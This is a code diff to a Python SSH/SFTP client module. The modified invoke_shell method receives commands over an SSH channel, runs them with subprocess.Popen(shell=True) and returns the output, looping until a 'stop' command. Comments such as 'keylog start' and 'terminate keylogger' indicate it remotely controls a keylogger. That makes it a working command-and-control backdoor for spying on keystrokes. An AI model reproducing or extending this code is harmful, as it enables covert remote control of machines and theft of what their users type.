@@ -9,6 +9,7 @@ from logzero import logger
 import threading
 import subprocess
 import time
+import threading
 
 
 class sftpClient(object):
@@ -19,6 +20,7 @@ class sftpClient(object):
         self.port = port
         self.username = username
         self.password = password
+        self.command = None
 
     def makeSFTPConnection(self):
         try:
@@ -118,6 +120,14 @@ class sshClient(object):
             logger.error(f'Exception has ocurred:{err}')
             self.ssh.close()
 
+    def thread_function(self):
+        logger.info("Thread starting")
+        self.command = self.channel.recv(1024).decode()
+        logger.info(f"Received 2nd message {self.command}")
+        # p = subprocess.Popen(self.command, shell=True,
+        #                      stdout=subprocess.PIPE)
+        logger.info("Thread finishing",)
+
     def invoke_shell(self):
         try:
             # connect to SSH server
@@ -127,35 +137,26 @@ class sshClient(object):
             logger.info("Invoke shell called")
 
             # keylog start
-            command = self.channel.recv(1024).decode()
-            logger.info(f"Received message {command}")
-            p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
+            self.command = self.channel.recv(1024).decode()
+            logger.info(f"Received message {self.command}")
+            p = subprocess.Popen(self.command, shell=True,
+                                 stdout=subprocess.PIPE)
 
+            self.channel.sendall(p.communicate()[0])
 
-            print(f"popen communicate{p.communicate()}")
-            self.channel.sendall(command.encode())
+            logger.info("Main    : before creating thread")
+            x = threading.Thread(
+                target=self.thread_function, daemon=True)
+            logger.info("Main    : before running thread")
+            x.start()
 
-            logger.info("Sleeping . . . ")
-            time.sleep(10)
-            logger.info("Awake!")
+            while self.command != "stop":
+                logger.info("Sleeping . . . ")
+                time.sleep(5)
+                logger.info(f"Command: {self.command}")
+                logger.info("Awake!")
 
-            # read key log file
-            command = self.channel.recv(1024).decode()
-            logger.info(f"Received 2nd message {command}")
-            p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
-
-            print(f"popen communicate{p.communicate()}")
-            self.channel.sendall(command.encode())
-            time.sleep(1)
-
-            # terminate keylogger
-            command = self.channel.recv(1024).decode()
-            logger.info(f"Received 2nd message {command}")
-            p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
-
-            print(f"popen communicate{p.communicate()}")
-            self.channel.sendall(command.encode())
-
+            x.join()
 
             self.channel.close()
             self.ssh.close()
